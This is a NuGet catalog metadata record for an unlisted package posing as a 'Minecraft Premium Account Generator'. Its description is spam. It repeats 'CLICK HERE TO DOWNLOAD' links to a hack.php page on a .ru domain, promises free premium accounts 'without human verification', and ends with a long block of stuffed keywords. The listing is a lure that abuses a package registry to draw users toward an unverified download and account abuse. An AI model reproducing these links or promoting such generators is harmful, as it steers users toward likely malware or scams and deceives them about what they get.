{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.17.19.12/_minecraft-premium-account-generator-working-2022-version-ejv.6.4.91.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "b3d722cd-cf99-4c09-98af-c25232871224",
  "catalog:commitTimeStamp": "2022-01-26T17:19:12.3815191Z",
  "created": "2022-01-26T11:18:07.663Z",
  "description": "# _Minecraft Premium Account Generator Working 2022 Version ejv\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://8.bltadwin.ru/hack.php](http://8.bltadwin.ru/hack.php)\n\n\nTheAltening is the best place to get a minecraft account generator. We offer free alts as well as an alt generator. Our in-house development team has also engineered and created a Minecraft premium account generator that you. download is one of the best place to get a free Minecraft account! Here, you can generate an Alt account with a single click instantly.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://8.bltadwin.ru/hack.php](http://8.bltadwin.ru/hack.php)\n\n · Minecraft Free Premium Accounts Hack Without Human verification download Since it was once dispatched a huge load of various individuals feel that its engaging. unread, Minecraft Free Premium Accounts Hack Without Human verification  Free Minecraft Accounts - New MC Account Generator tip download Get free Minecraft account, premium account now with this generator. Minecraft has been a super popular game for many, many years. It brings together millions and millions of players around the world. Its popularity is such that today very large accounts are sold on eBay for. To get rid of the account creation process, you can go through the Verify download Working Methods You Can Use To Create Free Premium Minecraft AccountsFortunately, there are plenty of options you can explore if you’re seeking to activate Premium Minecraft accounts for download even though some methods may be less direct than others, it’s.\n\nminecraft premium account generator 2021, minecraft premium account generator without human verification, minecraft premium account generator download, minecraft premium account generator apk, minecraft premium account generator 2022, minecraft premium account generator discord, minecraft premium account generator hypixel, minecraft premium account generator alt, minecraft premium account generator free, free minecraft premium account and password generator, minecraft premium generator alts, minecraft premium account generator no human verification, minecraft premium account generator 2017, minecraft.premium.account.generator.no.survey, best minecraft premium account generator, minecraft premium account code generator, como descargar minecraft premium account generator, minecraft premium account generator free download no surveys no password, minecraft premium account generator pc download, minecraft premium generator download, minecraft premium generator download free, minecraft java edition premium account generator, how to get minecraft java edition account for free, minecraft premium account generator 2021 free, minecraft free premium account generator 2020, free minecraft premium account generator no survey, free mc premium accounts generator, minecraft premium generator free, get premium minecraft account generator, minecraft account generator 2020, minecraft account generators, minecraft premium generator, minecraft java premium account generator, minecraft java account generator, minecraft premium account generator no verify, minecraft generator premium account no survey 2017, minecraft premium generator program, minecraft generator account free, minecraft generator account, minecraft premium account generator v2.11, minecraft premium account generator 2020, minecraft premium account generator 2019, minecraft premium generator 2020, minecraft premium generator 2021",
  "id": "_Minecraft-Premium-Account-Generator-Working-2022-Version-ejv",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-26T17:18:10.183Z",
  "listed": false,
  "packageHash": "HpWGJZIGHQpXaDQDjUJGTopCxt19QJ9JFoMLdaJWPkG/El1hWqRjvinwGvPPmsLf/JcDY0LCZEGI3qgNsnAESA==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11355,
  "published": "1900-01-01T00:00:00Z",
  "requireLicenseAcceptance": false,
  "title": "_Minecraft-Premium-Account-Generator-Working-2022-Version-ejv",
  "verbatimVersion": "6.4.91",
  "version": "6.4.91",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.17.19.12/_minecraft-premium-account-generator-working-2022-version-ejv.6.4.91.json#yarxppkszh.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1224,
      "fullName": "yarxppkszh.nuspec",
      "length": 3987,
      "name": "yarxppkszh.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.17.19.12/_minecraft-premium-account-generator-working-2022-version-ejv.6.4.91.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9471,
      "fullName": ".signature.p7s",
      "length": 9471,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}